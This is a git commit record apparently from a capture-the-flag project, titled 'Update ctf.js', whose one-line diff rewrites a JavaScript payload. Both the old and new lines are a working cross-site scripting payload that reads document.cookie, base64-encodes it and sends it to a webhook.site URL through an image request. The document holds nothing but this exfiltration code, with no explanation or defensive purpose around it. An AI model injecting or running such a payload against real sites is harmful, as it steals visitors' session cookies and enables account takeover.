515e4918cbbfb9122c3b5441882fdbfc7a716b0b
0xDbgMan <aboud.htb@gmail.com>
2025-11-19 14:49:12 +0200

    Update ctf.js

--- ctf.js
+++ ctf.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src ='https://webhook.site/6f5d44be-f19c-429a-97fa-52e0cc4d8ea6?data='+btoa(document.cookie);
+new Image().src = "https://webhook.site/6f5d44be-f19c-429a-97fa-52e0cc4d8ea6?c=" + btoa(document.cookie);
